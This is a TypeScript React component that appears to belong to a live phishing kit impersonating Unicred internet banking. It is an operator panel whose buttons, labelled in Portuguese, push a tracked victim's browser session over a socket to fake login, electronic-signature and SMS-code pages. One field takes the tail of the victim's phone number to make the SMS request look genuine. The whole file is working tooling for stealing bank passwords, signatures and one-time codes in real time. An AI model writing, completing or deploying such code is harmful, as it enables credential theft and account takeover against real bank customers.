'use client';

import { Dispatch, FormEvent, SetStateAction, useState } from 'react';

import socket from '@/config/socket';
import AdminAskProtocol from '@/interfaces/adminAskProtocol';

interface Props {
  setShow: Dispatch<SetStateAction<boolean>>;
  socketId: string;
}

export default function Ask({ setShow, socketId }: Props) {
  const [numberSMSValue, setNumberSMSValue] = useState('');

  const handleSocketEmitAdminAsk = (ask: AdminAskProtocol) => {
    socket.emit('admin-ask', ask);
  };

  const handleAskPassword = () => {
    const ask = {
      socketId,
      redirect: '/unicred-internetbanking/login',
      status: 'redirecionado para senha',
    };
    handleSocketEmitAdminAsk(ask);
    setShow(false);
  };

  const handleAskElectronicSignature = () => {
    const ask = {
      socketId,
      redirect: '/unicred-internetbanking/electronic-signature',
      status: 'redirecionado para assinatura eletrônica',
    };
    handleSocketEmitAdminAsk(ask);
    setShow(false);
  };

  const handleAskSMS = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!numberSMSValue) return;
    const ask = {
      socketId,
      redirect: '/unicred-internetbanking/code-sms',
      status: 'redirecionado para sms',
      numberSMS: numberSMSValue,
    };
    handleSocketEmitAdminAsk(ask);
    setShow(false);
    setNumberSMSValue('');
  };

  return (
    <div className="flex flex-col gap-2 w-full">
      <h3 className="text-base font-normal text-black">Pedir:</h3>
      <div className="w-full grid grid-cols-2 gap-3">
        <button
          type="button"
          className="bg-blue-100 text-blue-500 font-normal text-sm px-4 py-[5px] rounded-sm border border-solid border-black"
          onClick={handleAskPassword}
        >
          Pedir Senha
        </button>
        <button
          type="button"
          className="bg-blue-100 text-blue-500 font-normal text-sm px-4 py-[5px] rounded-sm border border-solid border-black"
          onClick={handleAskElectronicSignature}
        >
          Pedir assinatura eletrônica
        </button>
        <form
          onSubmit={handleAskSMS}
          className="flex items-center gap-2 text-sm  rounded-sm border border-solid border-black w-full "
        >
          <input
            value={numberSMSValue}
            type="text"
            className="bg-white w-1/2 h-full border-none text-black font-normal text-sm px-2"
            placeholder="Final do número"
            onInput={event => setNumberSMSValue(event.currentTarget.value)}
          />
          <button
            type="submit"
            className="bg-blue-100 text-blue-500 font-normal w-1/2 py-[5px] border-l border-solid border-l-black"
          >
            Pedir SMS
          </button>
        </form>
      </div>
    </div>
  );
}
